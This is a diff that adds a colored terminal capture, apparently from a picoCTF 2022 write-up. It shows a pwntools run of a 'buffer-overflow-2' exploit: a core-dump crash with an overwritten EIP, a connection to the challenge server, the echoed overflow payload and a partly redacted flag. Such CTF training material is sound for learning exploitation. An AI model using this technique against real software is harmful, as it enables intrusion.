@@ -1,0 +1,15 @@
+<span style="color:#DC3958">$</span> python3 buffer-overflow-2.py REMOTE
+[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 3988
+[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; stopped with exit code -11 (SIGSEGV) (pid 3988)
+[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/core&apos;
+    Arch:      i386-32-little
+    EIP:       0x62616164
+    ESP:       0xffca3290
+    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; (0x8048000)
+    Fault:     0x62616164
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
+[<span style="color:#277FFF"><b>*</b></span>] Switching to interactive mode
+Please enter your string: 
+\\xf0\\xfe\\xcadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaaavaaawaaaxaaayaaazaabbaabcaab\\x96\\x92\\x04r\\x93\\x04
+picoCTF{argum3nt5_4_d4yZ_<span style="color:#696969"><b>[REDACTED]</b></span>}
